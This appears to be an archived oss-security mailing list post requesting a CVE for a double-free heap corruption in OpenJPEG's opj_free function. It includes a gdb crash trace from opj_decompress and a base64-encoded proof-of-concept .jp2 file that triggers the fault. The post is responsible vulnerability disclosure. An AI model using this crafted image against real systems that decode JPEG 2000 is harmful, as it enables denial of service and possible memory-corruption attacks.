  oss-security - CVE request - OpenJPEG : Heap Corruption in opj_free function            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 14 Mar From: winsonliu(刘科) <winsonliu@...cent.com> To: oss-security <oss-security@...ts.openwall.com> Subject: CVE request - OpenJPEG : Heap Corruption in opj_free function  Hi all,  I find a vulnerability of OpenJPEG. The specific flaw exists within the opj_free function. A specially crafted image file can force Heap Corruption occurring in OpenJPEG. This issue can be reproduced in the latest version of OpenJPEG (https://github.com/uclouvain/openjpeg  The detailed information about this issue can be described as follows. --------------------------------- winson@...ntu:~/Desktop/repo/openjpeg/bin$ gdb opj_decompress -q Reading symbols from opj_decompress...(no debugging symbols found)...done.  (gdb) r -o image.pgm -i heap_corruption.jp2  Starting program: /home/winson/Desktop/repo/openjpeg/bin/opj_decompress -o image.pgm -i heap_corruption.jp2  [INFO] Start to read j2k main header [INFO] Main header has been correctly decoded. [INFO] No decoded area parameters, set the decoded area to the whole image [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [INFO] Header of tile 1 / 1 has been read. [INFO] Tile 1/1 has been decoded. [INFO] Image data has been updated with tile 1.  [INFO] Stream reached its end ! WARNING -> [PGM file] Only the first component            is written to the file [INFO] Generated Outfile image.pgm *** Error in `/home/winson/Desktop/repo/openjpeg/bin/opj_decompress': double free or corruption (!prev): ***  Program received signal SIGABRT, Aborted. in ?? ()  (gdb) bt #0  in ?? () #1  in malloc_printerr (action=<optimized out>, "double free or corruption (!prev)", at #2  in _int_free <main_arena>, p=<optimized out>, have_lock=0) at #3  in opj_free () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7 #4  in opj_image_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7 #5  in main ()  (gdb) x /i $eip => pop    %ebp  (gdb) i r  eax            0x0 0 ecx            edx            0x6 6 ebx            esp            ebp            esi            edi            eip            eflags         [ PF ZF IF ] cs             ss             0x7b ds             0x7b es             0x7b fs             0x0 0 gs             51   The attachment is the proof-of-concept file. Alternatively, you can decode the following string using base64 and save the decoded content to a .jp2 file. --------------------------------- AAAADGpQICANCocKAAAAFGZ0eXBqcDIgAAAAAGpwMiAAAABbanAyaAAAABZpaGRyAAAAIAAAACAA GQADAAMAAQAAAAABI2pwMmP/T/9RADIAAAAAACAAAAAgAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAA AAQEDwEEAQEEAQEAAQH/UgAMAAAAAQEFBAQAAf9cABNAKDAwODAwODAwODAwODAwOP9kACUAAUNy 9VfWofCMnawpQPlngP/Z   CREDIT: This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.  Download attachment "heap_corruption.jp2" of type "application/octet-stream" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      